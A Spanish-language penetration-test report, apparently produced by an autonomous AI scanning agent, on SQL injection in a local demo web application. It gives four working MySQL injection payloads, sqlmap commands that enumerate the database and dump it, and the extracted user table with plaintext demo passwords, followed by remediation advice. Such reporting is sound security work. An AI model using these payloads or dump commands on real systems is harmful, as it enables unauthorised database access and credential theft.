# Informe de Seguridad – SQL Injection
**Objetivo:** http://web.dev.local:8083  
**Fecha:** 2026-04-25T12:05:26Z  
**Herramienta:** sqlmap 1.9.10  
**Analista:** Agente Autónomo DAST (claude-sonnet-4.6)

---

## 1. Resumen Ejecutivo

Se realizó un análisis de seguridad dinámica (DAST) sobre la aplicación web disponible en `http://web.dev.local:8083`. Se identificó y explotó con éxito una vulnerabilidad crítica de **SQL Injection** en el parámetro GET `id`. El ataque permitió obtener acceso completo a la base de datos, incluyendo la extracción de credenciales en texto plano de 8 usuarios. El usuario de base de datos es `root@%`, lo que indica privilegios máximos.

**Severidad: CRÍTICA (CVSS 10.0)**

---

## 2. Vectores Analizados

| Vector | Tipo | Parámetro | Método |
|--------|------|-----------|--------|
| `/?id=1&Submit=Submit` | Formulario HTML (GET) | `id` | GET |

La aplicación presenta un único formulario de búsqueda por ID de usuario. El parámetro `id` es enviado mediante método GET y no aplica ningún tipo de sanitización ni uso de consultas preparadas.

---

## 3. Hallazgos

### 3.1 Vulnerabilidad Confirmada: SQL Injection en parámetro `id`

**Tecnología del servidor:**
- SO: Linux Debian
- Servidor web: Apache 2.4.65
- Lenguaje: PHP 8.1.33
- DBMS: MySQL 5 (MariaDB fork)
- Usuario BD: `root@%`

**Tipos de inyección detectados:**

#### a) Boolean-based Blind
```
Payload: id=5029' AND 6551=(SELECT (CASE WHEN (6551=6551) THEN 6551 ELSE (SELECT 2428 UNION SELECT 1249) END))-- -&Submit=Submit
```

#### b) Error-based (MySQL >= 5.0 FLOOR)
```
Payload: id=5029' OR (SELECT 8777 FROM(SELECT COUNT(*),CONCAT(0x71717a6a71,(SELECT (ELT(8777=8777,1))),0x717a716a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- mTmP&Submit=Submit
```

#### c) Time-based Blind (SLEEP)
```
Payload: id=5029' AND (SELECT 7778 FROM (SELECT(SLEEP(5)))JVzb)-- YZiE&Submit=Submit
```

#### d) UNION Query (2 columnas)
```
Payload: id=5029' UNION ALL SELECT NULL,CONCAT(0x71717a6a71,0x7266786d565148786279414c49575057486e62576c7a784d474c536d514662424c6c7042556d474b,0x717a716a71)-- -&Submit=Submit
```

---

## 4. Evidencia de Explotación

### 4.1 Usuario de base de datos
```
current user: 'root@%'
```

### 4.2 Bases de datos disponibles
```
[*] information_schema
[*] mysql
[*] performance_schema
[*] sqli_demo
[*] sys
```

### 4.3 Tabla extraída: `sqli_demo.users`

```
+---------+---------------------+-------------+-----------+-----------+------------+
| user_id | email               | password    | username  | last_name | first_name |
+---------+---------------------+-------------+-----------+-----------+------------+
| 1       | admin@example.com   | password123 | admin     | Doe       | John       |
| 2       | jane@example.com    | secret456   | jsmith    | Smith     | Jane       |
| 3       | bob@example.com     | mypass789   | bjohnson  | Johnson   | Bob        |
| 4       | alice@example.com   | qwerty123   | awilliams | Williams  | Alice      |
| 5       | charlie@example.com | password    | cbrown    | Brown     | Charlie    |
| 6       | diana@example.com   | secure123   | ddavis    | Davis     | Diana      |
| 7       | eve@example.com     | hackme      | emiller   | Miller    | Eve        |
| 8       | frank@example.com   | admin123    | fwilson   | Wilson    | Frank      |
+---------+---------------------+-------------+-----------+-----------+------------+
```

**Contraseñas en texto plano:** Las contraseñas no están cifradas (sin hash), lo que agrava la criticidad.

---

## 5. Comandos sqlmap utilizados

```bash
# Fase de descubrimiento
sqlmap -u "http://web.dev.local:8083/?id=1&Submit=Submit" --batch --level=3 --risk=2

# Fase de explotación - usuarios y bases de datos
sqlmap -u "http://web.dev.local:8083/?id=1&Submit=Submit" --batch --current-user --dbs

# Extracción de tablas
sqlmap -u "http://web.dev.local:8083/?id=1&Submit=Submit" --batch -D sqli_demo --tables

# Volcado completo de datos
sqlmap -u "http://web.dev.local:8083/?id=1&Submit=Submit" --batch -D sqli_demo -T users --dump
```

---

## 6. Conclusión

La aplicación web en `http://web.dev.local:8083` contiene una vulnerabilidad **crítica de SQL Injection** en el parámetro GET `id`. La explotación fue completamente exitosa:

- ✅ **Vulnerabilidad confirmada**: 4 tipos de inyección detectados (boolean-blind, error-based, time-based, UNION)
- ✅ **Privilegios máximos**: El usuario de la base de datos es `root@%`
- ✅ **Datos exfiltrados**: Credenciales completas de 8 usuarios en texto plano
- ✅ **Acceso total a la BD**: Enumeración completa de bases de datos, tablas y registros

**Recomendaciones de remediación:**
1. Usar consultas preparadas (Prepared Statements / PDO) en lugar de concatenación directa de SQL
2. Aplicar validación y sanitización estricta de entradas
3. Limitar los privilegios del usuario de base de datos (principio de mínimo privilegio)
4. Hashear las contraseñas con algoritmos seguros (bcrypt, argon2)
5. Implementar un WAF para detección y bloqueo de inyecciones
